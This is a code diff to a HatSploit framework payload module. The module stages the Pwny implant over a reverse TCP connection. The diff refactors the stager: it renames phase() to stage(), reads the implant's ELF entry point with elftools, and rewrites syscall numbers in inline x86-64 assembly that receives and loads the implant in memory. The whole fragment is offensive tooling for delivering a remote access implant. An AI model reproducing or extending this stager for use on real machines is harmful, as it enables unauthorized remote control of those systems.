@@ -4,10 +4,14 @@ This payload requires HatSploit: https://hatsploit.com
 Current source: https://github.com/EntySec/HatSploit
 """
 
+import io
+
 from pwny import Pwny
 from pwny.session import PwnySession
 
-from hatsploit.lib.payload.basic import *
+from elftools.elf.elffile import ELFFile
+
+from hatsploit.lib.core.payload.basic import *
 
 
 class HatSploitPayload(Payload, Handler):
@@ -28,11 +32,12 @@ class HatSploitPayload(Payload, Handler):
             'Type': REVERSE_TCP,
         })
 
-    def phase(self):
-        length = len(self.implant())
-        entry = self.elf_header(self.implant())['e_entry']
+    def stage(self):
+        implant = self.implant()
+        length = len(implant)
+        entry = ELFFile(io.BytesIO(implant)).header['e_entry']
 
-        return self.assemble(
+        return self.__asm__(
             f"""
             start:
                 push rdi
@@ -51,12 +56,12 @@ class HatSploitPayload(Payload, Handler):
                 mov r10, 0x100
                 xor r8, r8
                 xor r9, r9
-                mov rax, 45
+                mov rax, 0x2d
                 syscall
 
                 and rsp, -0x10
                 add sp, 80
-                mov rax, 112
+                mov rax, 0x70
                 push rax
                 mov rcx, rsp
                 xor rbx, rbx
